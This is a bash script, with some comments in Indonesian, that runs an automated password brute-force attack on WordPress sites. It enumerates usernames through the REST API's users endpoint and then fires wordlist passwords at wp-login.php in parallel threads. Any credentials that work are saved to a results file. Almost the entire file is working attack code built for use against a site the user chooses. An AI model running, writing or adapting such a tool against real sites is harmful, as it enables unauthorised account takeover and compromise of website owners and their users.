#!/bin/bash

curl_timeout=20
multithread_limit=10

if [[ -f wpusername.tmp ]]
then
        rm wpusername.tmp
fi
RED='\e[31m'
GRN='\e[32m'
CYN='\e[33m'
CLR='\e[0m'
CYN='\e[0;36m'

# Pindah ke virtual terminal agar tampilan lebih fokus
echo -e "\e[8;40;100t"
echo -ne "\033[H\033[J"

function _GetUserWPJSON() {
        Target="${1}";
        UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
        echo ""
        if [[ -z ${UsernameLists} ]];
        then
                echo -e "${CYN}INFO: Cannot detect Username!${CLR}"
        else
                echo -ne > wpusername.tmp
                for Username in ${UsernameLists};
                do
                        echo "INFO: Found username \"${Username}\"..."
                        echo "${Username}" >> wpusername.tmp
                done
        fi
}

function _TestLogin() {
        Target="${1}"
        Username="${2}"
        Password="${3}"
        LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
        if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
        then
                : # Jangan tampilkan list password yang salah
        elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
        then
                echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
                echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
        fi
}

# Print Banner
echo -e "\x1b[1;96m

                   __        ______                            
                  \ \      / /  _ \                           
                   \ \ /\ / /| |_) |                          
                    \ V  V / |  __/                           
  ____  ____  _   _ _\_/\_/__|_|_____ ___  ____   ____ _____  
 | __ )|  _ \| | | |_   _| ____|  ___/ _ \|  _ \ / ___| ____| 
 |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|   
 | |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___  
 |____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____| 



  https://target.com/wp-login.php
 ? = admin
 ? = pass.txt
 
"

echo -ne "[?] Input website target : \x1b[1;97m"
read Target

curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
then
        echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
        exit
fi

echo -ne "[?] Input password lists in (file) : \x1b[1;97m"
read password_list

if [[ ! -f ${password_list} ]]
then
        echo -e "${RED}ERROR: Wordlist file '${password_list}' not found!${CLR}"
        exit
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]
then
        for User in $(cat wpusername.tmp)
        do
                (
                        for Pass in $(cat ${password_list})
                        do
                                ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                                _TestLogin ${Target} ${User} ${Pass} &
                        done
                        wait
                )
        done
else
        echo -e "${RED}INFO: Cannot find username${CLR}"
        echo -ne "[?] Input username manually : \x1b[1;97m"
        read User

        if [[ -z ${User} ]]
        then
                echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
                exit
        fi
        echo ''
        (
                for Pass in $(cat ${password_list})
                do
                        ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                        _TestLogin ${Target} ${User} ${Pass} &
                done
                wait
        )
fi
echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wp-results.txt"
